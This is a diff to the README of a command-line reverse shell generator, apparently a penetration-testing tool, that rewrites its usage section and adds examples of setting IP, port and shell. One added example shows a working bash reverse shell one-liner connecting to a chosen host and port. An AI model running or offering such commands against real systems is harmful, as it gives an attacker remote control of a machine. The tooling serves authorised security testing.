@@ -27,6 +27,10 @@ revshell-generator -h
 
 # Usage
 
+You can use the Reverse Shell Generator either interactively or by passing parameters directly on the command line.
+
+
+
 ### Running the Reverse Shell Generator
 
 ```bash
@@ -37,14 +41,22 @@ Welcome to the reverse shell generator. Type 'help' or '?' to list available com
 ### Setting Reverse IP Address and Port
 
 ```bash
-$ python3 revshellgenerator.py
->> ip 192.168.45.19
-The IP address has been set as '192.168.45.19'
->> port 4200
-The port has been set as '4200'
+revshell-generator --ip 192.168.1.10 --port 8080 --shell /bin/bash
 ```
 
-Alternatively, you can provide the IP/port as script arguments to avoid prompting them later: `revshell-generator --ip 192.168.45.19 --port 4200`
+You can also specify the IP address by providing a network interface name:
+
+```bash
+revshell-generator --ip eth0 --port 8080 --shell /bin/bash
+```
+
+In interactive mode, you can set these parameters using the ip, port, and shell commands:
+
+```bash
+>> ip 192.168.1.10
+>> port 8080
+>> shell /bin/bash
+```
 
 ### Listing Available Reverse Shell Commands
 
@@ -67,15 +79,13 @@ $ python3 revshellgenerator.py
 >> get reverse 0
 ```
 
-Alternatively, you can provide the IP/port as script arguments and call the get reverse command straightaway:
+The above command will generate the first available reverse shell command, replacing the placeholders with the provided IP, port, and shell. Here's an example of how it might look:
 
 ```bash
-$ revshell-generator --ip 192.168.45.19 --port 4200
-Welcome to the reverse shell generator. Type 'help' or '?' to list available commands.
->> get reverse 0
+bash -i >& /dev/tcp/192.168.1.10/8080 0>&1
 ```
 
-№№№ Generating Listener Commands
+### Generating Listener Commands
 
 ```bash
 >> get listeners 10
